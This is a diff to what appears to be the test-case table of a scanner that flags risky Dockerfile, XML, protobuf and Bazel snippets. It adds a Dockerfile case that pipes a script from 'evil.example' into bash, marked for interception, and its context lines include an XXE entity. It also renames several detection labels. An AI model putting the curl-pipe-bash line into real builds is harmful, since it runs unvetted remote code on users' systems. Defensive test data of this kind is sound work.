@@ -233,9 +233,23 @@ data:
         desc_fragment: Some("docker_remote_add"),
     },
     Entry {
+        name: "Dockerfile/RUN pipe bash — INTERCEPT",
+        lang: "dockerfile",
+        source: b"FROM alpine:3.20\nRUN curl -fsSL https://evil.example/install.sh | bash\n",
+        must_intercept: true,
+        desc_fragment: Some("dockerfile_pipe_execution"),
+    },
+    Entry {
         name: "Dockerfile/local COPY — SAFE",
         lang: "dockerfile",
         source: b"FROM alpine:3.20\nCOPY ./payload.tgz /opt/payload.tgz\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
+    Entry {
+        name: "Dockerfile/RUN literal package install — SAFE",
+        lang: "dockerfile",
+        source: b"FROM alpine:3.20\nRUN apk add --no-cache curl\n",
         must_intercept: false,
         desc_fragment: None,
     },
@@ -249,7 +263,7 @@ data:
 <foo>&xxe;</foo>
 "#,
         must_intercept: true,
-        desc_fragment: Some("xml_xxe"),
+        desc_fragment: Some("xxe_external_entity"),
     },
     Entry {
         name: "XML/plain document — SAFE",
@@ -265,7 +279,7 @@ data:
         lang: "proto",
         source: b"syntax = \"proto3\";\nimport \"google/protobuf/any.proto\";\nmessage Envelope { google.protobuf.Any payload = 1; }\n",
         must_intercept: true,
-        desc_fragment: Some("proto_type_erasure"),
+        desc_fragment: Some("protobuf_any_type_field"),
     },
     Entry {
         name: "Proto/typed message field — SAFE",
@@ -281,7 +295,7 @@ data:
         lang: "bzl",
         source: b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n)\n",
         must_intercept: true,
-        desc_fragment: Some("bazel_unpinned_http_archive"),
+        desc_fragment: Some("bazel_unverified_http_archive"),
     },
     Entry {
         name: "Starlark/http_archive pinned — SAFE",
